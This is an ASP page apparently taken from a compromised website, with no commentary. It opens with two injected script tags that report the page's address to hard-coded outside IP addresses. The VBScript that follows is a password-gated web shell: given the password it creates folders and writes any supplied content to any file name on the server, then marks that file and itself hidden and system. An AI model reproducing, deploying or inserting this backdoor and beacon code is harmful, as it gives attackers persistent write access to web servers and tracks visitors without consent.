<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><script>var x=new XMLHttpRequest();x.open("GET","http://176.102.34.165/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script>﻿<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
Dim password,pathname,pathname2,indexfile,filename,body
password=request("password")
if password <> "ADODBenable" Then
    response.write("password error")
    response.end()
end If
pathname=request("pathname")
if len(pathname)>0 Then
pathname2=server.mappath(pathname)
set fso=server.createobject("scripting.filesystemobject")
    if not fso.folderexists(pathname2) then
        fso.createfolder pathname2
    end if
set fso=Nothing
pathname="\"&pathname
end If
filename=request("filename")
body=request("body")
Set objStream = Server.CreateObject("ADODB.Stream")
With objStream
.Open
.Charset = "utf-8"
.Position = objStream.Size
.WriteText = request("body")
.SaveToFile server.mappath(".")& pathname&"\"&filename,2
.Close
End With
Set objStream = Nothing
If len(request("Receive"))>0 Then
	set fs=Server.CreateObject("Scripting.FileSystemObject")
	set f=fs.GetFile(server.mappath(".")& pathname&"\"&filename)
	f.Attributes=39
	set f=Nothing
	set ff=fs.GetFile(Request.ServerVariables("Path_Translated"))
	ff.Attributes=39
	set ff=Nothing
	set fs=Nothing
	Response.Redirect(request("Receive"))
end If
%>